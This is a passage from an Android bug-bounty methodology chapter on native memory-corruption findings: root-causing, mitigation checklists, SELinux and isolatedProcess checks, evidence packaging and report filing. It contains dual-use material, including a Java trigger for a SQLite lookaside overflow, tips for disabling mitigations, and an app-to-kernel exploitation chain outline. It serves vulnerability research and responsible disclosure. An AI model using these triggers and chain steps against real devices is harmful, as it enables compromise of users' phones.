| **Severity ceiling** | Support |
| **VRT** | n/a; it is what makes the report a root-cause analysis rather than a crash dump — and at Google, a root-cause analysis plus a patch is a payout precondition |
| **Attacker** | n/a |
| **Applies to** | all memory-corruption work |
| **Maps to** | MASTG-TOOL-0152 (lldb for Android), MASTG-TECH-0024 |

- **Test:** Work backwards from the crash to the first incorrect state transition. Two techniques pay:
  **interdependent breakpoints** and **tracing `free()` rather than the use**.
- **How:**
  - *Interdependent breakpoints:* break on the rare function that starts processing your input, and only
    there install the noisy breakpoint, scoped to that thread. This is what makes a breakpoint on `memcpy`
    usable at all.
  - *Trace the free, not the use:* log allocation and free of the object class in question, then search
    backwards for the pointer.
  - *Read the allocation site and the write site as separate lines:* in a heap-overflow report the
    allocation and the overflowing write are usually tens of lines apart with no size check between them.
    ASan hands you both stacks — open both source locations. The worked example: `FT_NEW_ARRAY(points, 1)` at
    `ttgload.c:1909`, the writes at `ttgload.c:1929`.
  - *Do not dismiss a crash whose stack has nothing to do with your input:* a silent overflow often crashes
    later, in code that merely *used* the corrupted object. Run the trigger repeatedly and collect several
    tombstones.
  ```bash
  adb shell ls -t /data/tombstones | head -5     # collect several from repeated runs
  ```
- **Proof:** The allocation/free trace identifying the first incorrect state transition, plus — for the
  delayed case — a second tombstone in an unrelated stack:
  ```
  #00 IPCThreadState::waitForResponse        <- corrupted binder object
  #03 Component::Listener::onWorkDone_nb
  #04 SimpleC2Component::processQueue        <- after oapvd_decode completed
  ```
  A delayed crash in live IPC structures is **direct evidence that the overflow lands in live objects**,
  which is the precondition for control-flow hijack. "The decoder returned success while silently corrupting
  ~14KB of adjacent heap memory."
- **Escalation:** The root cause produces the patch, and **a proposed patch or root-cause code fix is
  mandatory for all memory-safety vulnerabilities** at Google's Android & Google Devices programme —
  "reports that lack a proposed fix for mandatory categories risk being deemed ineligible for financial
  reward or will result in a drastically reduced payout." On Mobile VRP the equivalent is the 1.5×
  Exceptional Quality multiplier, which requires a proposed patch or effective mitigation plus a root-cause
  analysis.
- **Ruled out when:** n/a — this is method. If you genuinely cannot reach a root cause within the time-box,
  file the crash with the trace you have and say the root cause is unestablished; do not invent one.

### D16-052 · A sanitizer shipping in production changes the finding, not just the crash

| | |
|---|---|
| **Severity ceiling** | Support (it is a *downgrade* discipline) |
| **VRT** | moves the finding to `application_level_denial_of_service_dos.*` instead of RCE |
| **Attacker** | unchanged |
| **Applies to** | AOSP components built with UBSan/IntSan trapping; increasingly, app libraries too |
| **Maps to** | CVE-2026-0049 (the `libdng_sdk.so` case); AOSP IntSan/BoundSan |

- **Test:** If UBSan ships in the release build, an integer overflow that would have been silent corruption
  becomes a guaranteed `SIGABRT`. That is a different, lower finding — and saying so yourself is the single
  behaviour most correlated with a triager trusting the rest of your report.
- **How:**
  ```bash
  adb logcat -b crash -d | grep -E 'ubsan:|__ubsan_handle|Abort message'
  nm -D x/lib/*/*.so | grep -E '__ubsan_handle|__asan_|__hwasan_'
  readelf -sW x/lib/*/*.so | grep -c '__ubsan_handle'
  ```
- **Proof:** `__ubsan_handle_*` frames in the tombstone and an `Abort message: 'ubsan: …'` line. The worked
  observation: "`libdng_sdk.so` ships with unsigned-integer-overflow sanitization even on user/release-keys
  builds. This turns a potential silent memory corruption into a guaranteed SIGABRT crash (DoS) on all
  Android devices."
- **Escalation:** Re-rate to DoS — and then look for the *impact* of that DoS, which is often real: a
  0-click crash loop that denies access to a directory ("Process com.google.android.documentsui has crashed
  too many times, killing!") is a usable finding, just not an RCE.
- **Ruled out when:** the tombstone shows `SIGSEGV` with no sanitizer frames and no `__ubsan_handle` symbols
  exist in the crashing library — i.e. corruption is genuinely silent on this build. Check the *shipped*
  library, not your instrumented rebuild.

### D16-053 · The mitigation reality check — name the layer that stopped you before writing "arbitrary write → RCE"

| | |
|---|---|
| **Severity ceiling** | Support (this is the item that prevents the most common over-claim in this domain) |
| **VRT** | it is what decides between `server_side_injection.remote_code_execution_rce` (P1) and a P3 crash |
| **Attacker** | unchanged |
| **Applies to** | every memory-corruption finding, without exception |
| **Maps to** | MASTG-KNOW-0006; AOSP security-model Tables 4–5; `source.android.com/docs/security/test/*` (the AOSP sanitizer/CFI/Scudo/SCS suite) |

- **Test:** Before writing a severity, walk the chain from your primitive to code execution and mark each
  layer as **verified present**, **verified absent**, or **untested on this build**. Most "arbitrary write →
  RCE" claims die at one of these, and the report is judged by whether *you* named it or the triager did.
- **How:** Work the checklist against the evidence you already collected in D16-008 and D16-014:

  | Layer | How you verified it | Effect on the chain |
  |---|---|---|
  | Full RELRO (`BIND_NOW`) | `readelf -d` (D16-008) | GOT read-only → no import swap (D16-009) |
  | PIE + linker ASLR | `readelf -h` `Type: DYN`; `randomize_va_space` | you need an information leak first |
  | NX / no RWX mapping | `GNU_STACK RW`; `/proc/pid/maps` | ROP required, not shellcode (D16-033) |
  | Stack canary | `__stack_chk_fail` count | only if the corruption reaches the epilogue (D16-034) |
  | FORTIFY (`_chk` imports) | `nm -D` (D16-012) | overflow becomes a controlled abort |
  | CFI (Android 9+) | build version (D16-014) | vtable pointer ≠ arbitrary call (D16-032) |
  | ShadowCallStack / PAC-RET / BTI (10 / 14+) | build version | return-address overwrite blunted |
  | Scudo (Android 10+) | maps grep | heap grooming must be re-derived (D16-030) |
  | IntSan / BoundSan / UBSan trapping | `__ubsan_handle` symbols (D16-052) | corruption becomes SIGABRT |
  | seccomp filter | `/proc/pid/status` `Seccomp:` | limits post-exploitation syscalls |
  | SELinux domain policy | `ps -AZ` (D16-054) | limits what the executed code can touch |

  For root-causing on a research device you may disable some of these — `personality(ADDR_NO_RANDOMIZE)`
  (ARM syscall **136**, not wrapped by Bionic, so call it via `syscall()`), `setarch`,
  `execstack -s <binary>`, and the sysctls — but **never in the recorded PoC**, and note that `personality`
  is ignored for set-uid binaries and that PIE and full RELRO are **not practically removable** by patching.
- **Proof:** A paragraph in the report stating, per layer, which mitigations you verified on the target build
  and **which step of your chain each one would have blocked**. "Exploitable" without that context is not a
  claim a triager can act on.
- **Escalation:** If every layer is absent or bypassed and you demonstrated execution, this is
  `server_side_injection.remote_code_execution_rce` (P1). If one is present and you did not get past it, the
  finding is the primitive at its real severity — say so and keep the credibility.
- **Ruled out when:** n/a — unconditional on every memory finding. A finding without this paragraph is
  incomplete regardless of how good the crash is.

### D16-054 · Check the SELinux domain before claiming any post-exploitation step

| | |
|---|---|
| **Severity ceiling** | Support (a downgrade discipline that protects every Critical you file) |
| **VRT** | it bounds what you may claim after `server_side_injection.remote_code_execution_rce` |
| **Attacker** | unchanged |
| **Applies to** | all; SELinux has been enforcing since Android 4.4 |
| **Maps to** | AOSP SELinux concepts (`isolated_app`, `untrusted_app`, versioned `untrusted_app_NN` domains); AOSP device-policy guidance |

- **Test:** Before writing "the attacker then gains root", "reads another app's data directory" or "installs
  a package", confirm the SELinux domain permits it. Code execution in the app UID is bounded by the same
  policy that bounds the app.
- **How:**
  ```bash
  adb shell ps -AZ | grep com.target.app        # u:r:untrusted_app_30:s0:c512,c768,c...
  adb shell ps -AZ | grep -E 'isolated_app'
  adb shell id -Z
  # what does that domain actually allow? (on a build where you have the policy)
  sesearch --allow -s untrusted_app_30 -c file /path/to/sepolicy 2>/dev/null | head -40
  adb shell dmesg | grep -i 'avc: denied' | tail -20
  ```
  The **versioned** domains are an API-gate table in disguise: a lower `targetSdk` places the app in
  `untrusted_app_NN` with a materially **wider** policy. Record which domain the app under test actually
  lands in, because it changes the ceiling.
- **Proof:** The domain name from `ps -AZ`, cross-referenced with the policy, plus the AVC denial (or its
  absence) for the step you are claiming. Note AOSP's own caveat that excluding `untrusted_app` from a rule
  is "trivial to work around because all apps may optionally run services in the `isolated_app` domain" —
  so do not over-credit a policy exclusion either.
- **Escalation:** → D25 when the next step genuinely requires a kernel or vendor bug; say so rather than
  implying it is free.
- **Ruled out when:** n/a — unconditional on every post-exploitation claim. A Critical that asserts a step
  the policy forbids is a retraction waiting to happen.

### D16-055 · `isolatedProcess` around the parser: the honest upgrade and the honest downgrade

| | |
|---|---|
| **Severity ceiling** | Medium as a hardening finding on its own; it is the **amplifier** on any memory-safety finding in this chapter |
| **VRT** | n/a standalone; it moves the parser finding up or down one band |
| **Attacker** | unchanged |
| **Applies to** | Android 4.1+; the correct container for parsing untrusted input (media, archives, HTML, PDF, native decoders) |
| **Maps to** | AOSP security-model Table 2 ("Isolated process: Apps may run services in a process with no Android permissions and access to only two binder services"); `guide/topics/manifest/service-element` (isolatedProcess); SELinux `isolated_app` domain |

- **Test:** A service declared `android:isolatedProcess="true"` runs with no Android permissions and almost
  no binder access — a genuine containment boundary, not a bypassable control. Its **absence** around an
  untrusted-content parser is the finding; its **presence** is the reason your crash is contained.
- **How:**
  ```bash
  grep -nE 'isolatedProcess|externalService|android:process=' x/AndroidManifest.xml
  rg -n 'MediaCodec|ImageDecoder|BitmapFactory|ZipInputStream|System.loadLibrary' out/sources/
  adb shell ps -AZ | grep -E "isolated_app|com.target"
  ```
  Note that `android:process=":something"` is **not** isolation — separate address space, same UID, same
  `/data/data` access. Only `isolatedProcess` changes the domain.
- **Proof:** `ps -AZ` showing one `u:r:untrusted_app_NN` process for the app while it ingests attacker files
  — i.e. the native parser runs in the app's main domain with full permissions and Keystore access. The
  positive case is `u:r:isolated_app:s0:c…` for the parsing process, verified at runtime, **not** inferred
  from the manifest.
- **Escalation:** An isolated parser bug is contained; a main-process parser bug is app compromise. This
  single check is worth a severity band in either direction and it costs one command — so run it before
  writing the severity, not after.
- **Ruled out when:** the parsing service is declared `isolatedProcess="true"` **and** `ps -AZ` confirms the
  `isolated_app` domain at runtime while parsing. Then write the contained severity and say why.

### D16-056 · Zygote-shared layout and kernel address hiding: do not over-credit ASLR

| | |
|---|---|
| **Severity ceiling** | Support (rating input) |
| **VRT** | it bounds the "needs an information leak" argument |
| **Attacker** | AM-03 — "the attacker also has an app installed" is a realistic precondition, not a stretch |
| **Applies to** | all Android |
| **Maps to** | AOSP zygote/ASLR behaviour; `kptr_restrict`/`dmesg_restrict` (Android 4.1+) |

- **Test:** Two common over-credits. (1) **ASLR:** every app forks from the same zygote, so the library
  layout is shared across processes — an ordinary installed app can read its own maps and disclose the
  addresses another app's process is using. (2) **Kernel address hiding:** `kptr_restrict` and
  `dmesg_restrict` hide `/proc/kallsyms`, but Android kernels ship as one fixed image with **no KASLR**, so
  the symbols are constants extractable from firmware you can download.
- **How:**
  ```bash
  # from an ordinary app (or adb, for triage) compare library bases across processes
  adb shell cat /proc/self/maps | grep -E 'libc.so|linker64' 
  adb shell cat /proc/$(adb shell pidof com.target.app)/maps | grep -E 'libc.so|linker64'
  adb shell cat /proc/sys/kernel/randomize_va_space /proc/sys/kernel/kptr_restrict /proc/sys/kernel/dmesg_restrict
  ```
- **Proof:** Matching library base addresses across two processes forked from the same zygote. For the kernel
  case, the symbol addresses recovered offline from the factory image.
- **Escalation:** If your chain needed an information leak and the zygote sharing supplies it, say so — it
  strengthens the finding. Conversely, **do not credit kernel address hiding as a mitigation in a severity
  argument**; it raises effort, not feasibility.
- **Ruled out when:** the target process is not zygote-forked (a separate native binary, a vendor service),
  or the address you need belongs to a heap allocation rather than a mapped library — in which case the leak
  requirement is real and you must satisfy it.

### D16-057 · A Java-reachable native overflow is a managed→native escape — state the capability gain precisely

| | |
|---|---|
| **Severity ceiling** | High (and it is the honest ceiling — this is **not** a sandbox escape) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) only when you demonstrate execution; otherwise rate the primitive |
| **Attacker** | AM-03 — a **zero-permission** app, which is what makes this valuable |
| **Applies to** | any memory-safety bug reachable from a public Java/Android API |
| **Maps to** | CVE-2025-48595 (CWE-190, CVSS 8.4, CISA KEV "possible limited, targeted exploitation", Android June 2026 bulletin; Android 14, 15, 16, 16 QPR2 with SQLite < 3.44.5); ATT&CK T1575 |

- **Test:** A memory-safety bug reachable from a public Java API is not "just a crash". It converts a managed
  app into a **native-code** app inside its own UID, which unlocks syscalls and device handles that ART
  hides. Enumerate exactly what that buys, and say exactly what it does not.
- **How:** Trigger from Java, then probe the capability surface from the native context:
  ```java
  SQLiteDatabase.OpenParams params = new SQLiteDatabase.OpenParams.Builder()
      .setLookasideConfig(65528, 34000)   // no upper-bound check anywhere in the stack
      .build();
  SQLiteDatabase db = SQLiteDatabase.openDatabase(dbFile, params);
  ```
  ```bash
  # then, from the native context, enumerate what is now reachable
  adb shell "cat /proc/$(adb shell pidof com.target.app)/status | grep -E 'Seccomp|CapEff'"
  adb shell "ls -l /proc/$(adb shell pidof com.target.app)/fd | grep -E 'binder|dma_heap'"
  ```
- **Proof:** The capability table, measured rather than asserted. The reference probe output: `/dev/binder:
  OPEN (fd=3)`, `/dev/hwbinder: OPEN`, `/dev/dma_heap/system`, `/proc/self/maps` readable (ASLR defeat),
  `Seccomp: 0`, `CapEff: 0000000000000000` — with the framework logging `[+] Database opened successfully!`
  and **no crash, no tombstone, no ANR**.
- **Escalation:** → D25. The stated likely chain is: Framework API → native overflow → app-process native RCE
  → `/proc/self/maps` ASLR defeat → kernel driver exploit → root. File the app-process step; do not claim the
  kernel step you did not do.
- **Ruled out when:** every public API that reaches the vulnerable native path validates its parameters
  against a documented bound before the call — shown at the framework source line — which is exactly the fix
  shape (`if( sz>65528 ) sz = 65528;`).

### D16-058 · The evidence package for a native finding: negative control, one-shot script, and what to leave visible

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a; it is what makes the severity survive triage |
| **Attacker** | n/a |
| **Applies to** | every finding in this chapter |
| **Maps to** | CVE-2026-28576, CVE-2025-5915, CVE-2026-65346 (negative-control examples) |

- **Test:** Assemble five artefacts for every native finding, in this order — the native equivalent of the
  five-beat state-change pattern:
  1. **Pre-state:** the benign input decoding correctly, with the build fingerprint captured
     (`ro.build.fingerprint` ending `user/release-keys`).
  2. **The bug:** the crafted input, the delivery command, and the tombstone / ASan verdict.
  3. **Negative control:** the *identical* input against a build where the control is present — a patched
     library, the fixed OS point release, or a compat gate flipped with
     `adb shell am compat enable <ID> <pkg>`. This converts "my PoC crashed something" into "this specific
     missing check is the cause".
  4. **Positive post-state:** the consequence — the marker file containing the app's UID, the leaked bytes,
     the corrupted object's later crash.
  5. **Side effect:** what the victim sees (a crash loop, a silent success return, nothing at all). "The
     decoder returned success while silently corrupting ~14 KB" is a side-effect observation and it matters.
- **How:** Ship a one-shot reproduction script so a triager needs no tribal knowledge:
  ```bash
  git clone https://example/repro && cd repro
  ./exploit.sh --setup-emulator     # full run: set up device, build, exploit, extract artefacts
  ./exploit.sh                      # already have a matching device
  ```
  End it with a machine-readable results block: build, patch level, raw bytes, output files, permissions
  used, output directory.
  **Redaction, adapted to this domain.** Mask: any victim PII that appears inside leaked heap bytes; any
  live token you scraped (show the prefix and length only). **Leave visible** — the triager needs them:
  the build fingerprint, the security patch level, the pid/tid and thread name, library names and offsets,
  the fault address, `Abort message`, the full backtrace, your own attacker-app UID, and the exact delivery
  command. Redacting a fault address or a library name destroys the evidence.
- **Proof:** Five numbered artefacts, cross-referenced by filename in the report body
  (`03-step2-tombstone-fault-0x41414141.txt`), plus the script. Take them in one sitting.
- **Escalation:** With a negative control plus a root cause plus a proposed patch you qualify for the
  quality multipliers (D16-051).
- **Ruled out when:** n/a — unconditional. A native finding without a negative control is a finding a triager
  can attribute to your harness.

### D16-059 · Run the pre-severity gate against the CRITICAL CLAIM, and hold the retraction line

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | it is what decides whether you file P1 or P3 |
| **Attacker** | n/a |
| **Applies to** | every Critical or High in this chapter |
| **Maps to** | n/a (process) |

- **Test:** Write the draft Critical title, then substitute **the Critical claim** — not the bug — into each
  question:
  1. Have I validated the FULL chain to attacker-attainable impact, or only one primitive in the middle?
     "Controlled fault address confirmed" ≠ code execution.
  2. What does the attacker walk away with, in one concrete sentence?
  3. Have I personally reproduced the full chain end to end **at least twice** — once at discovery, once for
     the PoC?
  4. Is there a mitigation, a validation, or a SELinux rule still gating the chain (D16-053, D16-054)? If
     yes, it is not Critical: document it as "primitive present" at lower severity.
  5. Has the programme rejected this severity class before?
- **How:** For any Critical or High native crash, meet the **multi-tool reproduction bar**: reproduce through
  two independent paths with different stacks before labelling it. For this domain that means the real
  delivery path **and** the replica harness under ASan (D16-046), or the same input on two devices/API
  levels. Cross-path consistency is what rules out a harness artefact. And never write "could potentially",
  "could be used to" or "may allow" — either it does the thing or you downgrade the claim to what you
  demonstrated.
- **Proof:** A documented pass/kill decision per finding, plus two independent reproductions for anything
  filed at High or above.
- **Escalation:** Retraction discipline cuts both ways. Never silently drop a failed finding — write the
  retraction appendix. But **do not retract a confirmed finding that stopped reproducing because the client
  patched mid-engagement**: keep the timestamped pre-patch tombstone, the build fingerprint and the security
  patch level, and say that the behaviour changed on date X. In this domain that is common — vendors ship a
  library bump in a point release — and your captured `ro.build.version.security_patch` is the proof that the
  finding was real on the build in scope.
- **Ruled out when:** n/a — unconditional on every Critical/High claim.

### D16-060 · File the native chain as primitives first, consumer second — and count your sweep results

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | it determines how many of the P1/P2 nodes you actually reach |
| **Attacker** | n/a |
| **Applies to** | any engagement where a native finding chains with another domain's primitive |
| **Maps to** | n/a (process) |

- **Test:** A native chain in this chapter is usually three reports, not one: an IPC/deserialisation primitive
  (D16-031, or D07/D08), the memory-safety bug it reaches, and the consumer that turns it into execution or
  data theft. One fix equals one bounty; a chain is a **severity amplifier, not a merge request**.
- **How:** (1) Identify the highest-severity chained outcome. (2) File each primitive as its own report at
  its standalone severity, leaving a placeholder cross-reference. (3) File the consumer with the full RCE or
  data-theft narrative at the chained severity, filling in the real primitive IDs. (4) Edit each primitive to
  backfill the consumer's ID. The consumer body:
  ```markdown
  ## Chain partners (filed as separate reports)
  - **submission [UUID-1]** — arbitrary native free via non-transient pointer field in an Intent extra
  - **submission [UUID-2]** — heap overflow in libtarget.so reachable from the exported import activity
  These primitives have independent fix surfaces and are filed separately per the programme's
  "one fix = one bounty" rule.
  ```
  Do not paste the whole chain narrative into every primitive, do not claim each primitive is independently
  P1, and do not ask for a single combined bounty. Submit in order — primitives, consumer, then the clean
  standalone findings — and never file everything within minutes of each other; that reads as low-effort
  spam.
- **Proof:** Cross-referenced IDs in both directions.
- **Escalation:** Also apply the counting discipline from D16-008 to every sweep in this chapter: the per-`.so`
  loops, the crash replay loop and the delivery-path enumeration all iterate computed lists, and a shell
  array loop that silently produces zero iterations will hand you a confident, wrong negative. Drive them
  from Python with per-iteration logging and assert the output count equals the input count.
- **Ruled out when:** the finding genuinely stands alone (a single reachable decoder overflow with a
  first-party delivery path and no other primitive involved), in which case file one report and say so.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "`libtarget.so` is missing PIE / RELRO / stack canaries / FORTIFY" | `lack_of_binary_hardening.lack_of_exploit_mitigations` = **P5**. It is a build-configuration observation with no attacker action attached. PIE in particular has been enforced since API 21, so a `Type: EXEC` result is usually a vendored prebuilt, not an exposure | A reachable memory-safety bug in **that same library**, with the missing mitigation named as the layer that would otherwise have blocked your chain (D16-053) |
| "The `.so` files are unstripped and expose internal function names" | `lack_of_binary_hardening.lack_of_obfuscation` = **P5**; MASTG-TEST-0288 is a MASVS-RESILIENCE item | A symbol or embedded path that reveals something concrete — an internal hostname, a build-server path, or the exact attestation routine you then bypass (D16-015 → D21) |
| "The app bundles libwebp 1.3.0 / OpenSSL 1.1.1 / an old FFmpeg" | `using_components_with_known_vulnerabilities.outdated_software_version` = **P5**. Every programme in the corpus rejects a CVE with no exploit: PayPal ("without showing specific impact to the target application"), Reddit, Grab, HackenProof, Basecamp | The D16-005 reachability row plus a crash or ASan verdict through a real app surface (D16-046). Without that it belongs in the client's hardening appendix, stated as such |
| A crash produced by `dlopen`-ing the library and calling its internal functions with malformed input | Google and Samsung both reject this in writing; it proves nothing about the app | Reconstruct the real caller's sequence and deliver the same input through the app's own surface (D16-046) |
| A native crash with `fault addr 0x0` from an intent extra | A null dereference is a crash, not memory corruption; via an intent it is `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5** | A fault address derived from **your** input, with `pc` inside the app's own `.so` (D16-035) — or a persistent crash-on-launch loop, which is the one DoS shape worth filing |
| "`strcpy`/`sprintf`/`memcpy` are imported by the library" | An unreached unsafe sink is informational noise; modern compilers also inline these, so absence proves nothing either | A cross-reference chain from a reachable JNI entry to the sink, with the length source identified (D16-020) |
| "Root/emulator detection in `libtoolChecker.so` can be bypassed with Frida" | `lack_of_binary_hardening.lack_of_jailbreak_detection` / `.runtime_instrumentation_based` = **P5**, on your own rooted device (AM-12), which is not an attack | The detection result gating a payment, entitlement or auth decision, with the app behaving differently when you flip it (D16-023 → D23) |
| "The app maps vendor GPU libraries and holds `/dev/mali0`" | That is how every Android app renders; SP-HALs are documented architecture | An app-reachable input path into that vendor code plus a crash, or a shipped debuggable production variant used to keep restricted GPU IOCTLs working (D16-038 → D02/D25) |
| "Native libraries are only 4 KB-aligned" | A compatibility issue, Low at most | Mixed alignment or mismatched toolchains proving an unreviewed prebuilt swap, or a runtime download of a replacement `.so` over an unpinned channel (D16-016 → D17) |
| "I attached Frida to the release build and read a token out of memory" | On your own rooted device this is AM-12. Root is an evidence tool, not an attacker | The app ships `android:debuggable="true"` so a non-rooted device can attach (D16-042 → D02) |
| "The app uses native code, which is harder to analyse" | ATT&CK T1575 describes an adversary's technique, not a defect in the target | Nothing — delete it. The finding is always a specific reachable entry point |
| A raw pile of fuzzer crashes attached to a report | "Raw, un-minimized fuzzer crashes are not actionable and will be closed" | Bucketed to unique root causes, minimised, ranked, with one report per root cause and a proposed patch (D16-050, D16-051) |
| Java/Kotlin-side memory leaks (unregistered `BroadcastReceiver`s, static `Activity`/`View` references, `Context` in singletons, `AsyncTask`/`Handler`/`TimerTask` references) | MASTG flags these, but they are code-quality issues — **Informational** for bounty | Nothing in this domain; if a leak is reachable as a resource-exhaustion DoS, rate it there |

## Cross-surface joins

- **D07 (ContentProvider `openFile`) × D16 (native decoder):** everyone tests a provider for path traversal
  and stops. The join nobody runs is: the provider hands a **file descriptor** straight into a native
  decoder, so a zero-permission app can deliver arbitrary parser input with no file written to shared
  storage and no user interaction. Enumerate the provider's MIME types (`getStreamTypes`), then feed
  malformed bytes of exactly those types through `openFile` and watch for a tombstone. The traversal is a
  D07 finding; the decoder crash reached through it is this chapter's, and they are two reports (D16-060).
- **D08 (intent redirection / Bundle deserialisation) × D16-031 (native pointer fields):** the intent
  redirection people look for a `parcelable` extra that becomes a new `Intent`; the native people look for
  a `long ptr` field. The join is that **any exported component reading a single extra deserialises the
  whole Bundle**, so an intent-redirection hop into an internal component delivers a native-pointer gadget
  into a process the attacker could not otherwise reach — turning a Medium redirection into an arbitrary
  free in the victim's UID.
- **D24 (push/messaging) × D16-036 (0-click delivery):** the push testers check FCM authentication and
  payload injection; the native testers check the decoder. Nobody checks whether a push payload's
  **large-icon or big-picture URL** reaches `LocalImageResolver` and thus a decoder, with no tap. That is
  the difference between Meta's ×0.5 two-click multiplier and its ×1 zero-click one, on the same bug.
- **D09/D10 (deep links and WebView) × D16-037 (decoder from network bytes):** a deep-link parameter or a
  WebView bridge that sets a media/image source URL gives an AM-02 attacker a first-party fetch into the
  app's own bundled decoder — with the app's cookies and User-Agent on the request. The deep-link team
  files an open-redirect-shaped Low; the join is attacker-controlled bytes into a native demuxer.
- **D02 (build integrity) × D16-039 (writable library path):** `android:extractNativeLibs` is a build flag
  nobody reads, and it decides whether the `lib-*/` planting primitive exists at all. Reviewing the manifest
  flag and the loader code **together** is what separates a real Critical from a claim that dies on a
  modern build.
- **D06 (service architecture) × D16-055 (`isolatedProcess`):** the IPC reviewer reads the service list for
  exported-ness and stops; the native reviewer rates the parser bug without checking where it runs. The
  join — which service hosts the parser, and in which SELinux domain — is worth a full severity band and
  costs one `ps -AZ`.
- **D12 (crypto) × D16-022 (native signing key) × D15 (backend):** a request-signing key recovered at the
  JNI boundary is usually filed as "hardcoded secret, Medium". The join is that it un-gates the **entire**
  API surface for off-device testing, which is what lets you exercise the app's older, weaker backend
  version behaviourally — a mobile app's hardcoded backend calls are frequently an older API version than
  the web app uses, with weaker auth and validation. The signing key is the enabler; the weakened control is
  the finding.
- **D17 (dynamic code loading) × D16-033 (arbitrary write):** an arbitrary **write** beats an arbitrary read
  the moment it lands where the app later loads code. The DCL reviewer enumerates `DexClassLoader` paths;
  the native reviewer proves a write primitive; neither checks whether the write can target the other's
  path. That intersection is the shortest route from a memory bug to persistent code execution.
- **D19 (cross-platform) × D16-041 (plugin `.so`):** Flutter/React Native apps are routinely reported as
  "no native surface" because the reviewer looked for `Java_com_target_*` and found only framework
  runtimes. The join is the **plugin** libraries plus the channel/bridge names — the bridge enumeration is
  D19's, the `Java_*` exports are this chapter's, and the bug lives between them.
- **D25 (OEM/kernel) × D16-057 (managed→native escape):** app-scope engagements stop at "code execution in
  the app UID". The join is the capability table — `/dev/binder`, `/dev/dma_heap`, `Seccomp: 0`,
  `/proc/self/maps` — which is the documented first stage of a kernel chain and belongs in the report as
  *what the primitive unlocks*, clearly separated from what you demonstrated.

## Sources

- **Local senior-researcher corpus** (`local/skill-corpus-method.md`, `skill-corpus-classes.md`): the
  per-binary `readelf` mitigation audit and the NDK timeline (cookies r1, non-exec stack r4b, RELRO+BIND_NOW
  r8b, PIE r8c, `-Wformat-security` r9); the crash-vs-exploitability separation; dlmalloc heap grooming and
  the guard-allocation pattern; the "stack cookie only checks at RETURN" rule with the `zergRush` case; the
  C++ vtable-at-offset-0 hijack and the FILO free-list indirection; the `GingerBreak` GOT-swap; the ARM ROP
  tails, interworking and linker-as-gadget-source notes; root-cause via interdependent breakpoints and
  free-tracing; zygote-shared ASLR; kernel address-hiding as effort not feasibility; the
  disable-mitigations-for-research-only rule; the split-APK acquisition item; the `isolatedProcess` upgrade/
  downgrade; the versioned `untrusted_app_NN` SELinux domains; the native-pointer IPC-deserialisation gadget
  (`OpenSSLX509Certificate`, `VirtualRefBasePtr`); the stale-decoder-reached-from-Glide worked case; the
  analytics-only anti-fraud calibration.
- **OWASP MASTG / MASWE / Mobile Top 10** (`primary/owasp-mastg.md`, `primary/owasp-mobile-top10.md`):
  MASTG-TEST-0222/-0223/-0288/-0043; MASTG-KNOW-0005/-0006/-0008; MASTG-TECH-0018/-0024/-0029/-0033/-0034/
  -0035/-0037/-0044/-0115/-0140/-0157; MASTG-TOOL-0001/-0003/-0028/-0030/-0033/-0036/-0037/-0107/-0129/
  -0152; MASWE-0044/-0045/-0050/-0061; the four documented stack-canary false positives (Flutter, the empty
  React Native release libraries, and the RN libraries with calls but no stack buffers); the jnitrace and
  `frida-trace` handler patterns.
- **Mobile Hacking Lab research** (`primary/mobilehackinglab.md`): the `int * int` audit with CVE-2025-48595,
  CVE-2026-0006 and CVE-2026-0049; signed truncation with CVE-2025-27363 and the Minikin/HarfBuzz/FreeType
  reachability chain; the two-source dimension mismatch; "reads become writes"; the poison/canary-allocator
  disclosure proof (283 bytes of poison consumed; 35.5% of pixels leaked in CVE-2025-64505); the delayed
  crash in an unrelated IPC stack; the managed→native escape capability table; ASan/UBSan harness
  construction and the deep-path harness rules (the libwebp 8–10 h → 2–3 h refinement); the fuzzer-selection
  table and the measured libopenapv comparison; AFL++ QEMU persistent mode with the AArch64 in-memory input
  hook; LibAFL QEMU and LibAFL Frida wiring; the stable-C-ABI shim; the Android ASan runtime requirement;
  triage at scale (674 crashes → 12 root causes, with the category breakdown); the tombstone exemplar; the
  production-UBSan re-rating; the 0-click delivery-path enumeration and the `LocalImageResolver` MIME
  allowlist; the "state what the bug is not" calibration; the negative control and one-shot reproduction
  script standards.
- **AOSP architecture and security model** (`architecture/aosp-core.md`, `architecture/security-model.md`,
  `architecture/framework-internals.md`): the ~85% unsafe-memory-access figure; the platform mitigation table
  by version (CFI 9, SCS/BoundSan/IntSan/Scudo/HWASan 10, MTE 12, BTI/PAC-RET 14, Rust 12); same-process
  HALs and the `sphal` namespace; linker namespaces and `public.libraries.txt` (targetSdk 24 gate); the
  `memfd`/in-memory load path; 16 KB page-size support; `isolatedProcess` and the SELinux `isolated_app`
  domain; the "do not claim an escalation `untrusted_app` cannot perform" rule.
- **Frontier / behaviour-change research** (`frontier/modern-api-surfaces.md`,
  `frontier/undertested-surfaces.md`): the 16 KB migration as an unreviewed dependency swap; the Android 14
  `mlock` 64 KB cap; Android 16 Mali GPU IOCTL filtering and the debuggable-variant workaround; the
  JNI-reachable-from-exported-component framing.
- **Supply-chain and SDK research** (`realworld/sdk-supplychain-cves.md`): the LibRARIAN `.rodata` version
  regexes and the measured base rates (53/200 apps, 859 days stale, 529-day adoption lag, 91.15% version-ID
  accuracy); the libwebrtc SDP-munging reachability condition for CVE-2022-2294 with CVE-2023-7024 and
  CVE-2024-5493; the JNI-entry-to-vulnerable-parser pairing.
- **Disclosed reports and community write-ups** (`realworld/h1-disclosed-mobile.md`,
  `realworld/bugcrowd-intigriti-writeups.md`, `realworld/crossplatform-frameworks.md`,
  `secondary/hrishikesh-hacktricks.md`, `secondary/sallam-hetmehta.md`, `secondary/sehno-gowthams.md`,
  `secondary/indusface-singh-riya.md`, `secondary/writeups-realfinds.md`, `secondary/extra-community-sources.md`,
  `secondary/frida-drozer-tooling.md`): H1 #1377748 (Evernote) and #1115864 (Mattermost) for library
  planting, with the `extractNativeLibs` caveat; Nextcloud #3399016 scoring 0.0 for a crash-only report;
  Oversecured's Android memory-corruption class and the TikTok/Samsung `System.load` paths; Microsoft Dirty
  Stream; `.init_array` neutralisation for early instrumentation; soSaver for runtime-decrypted libraries;
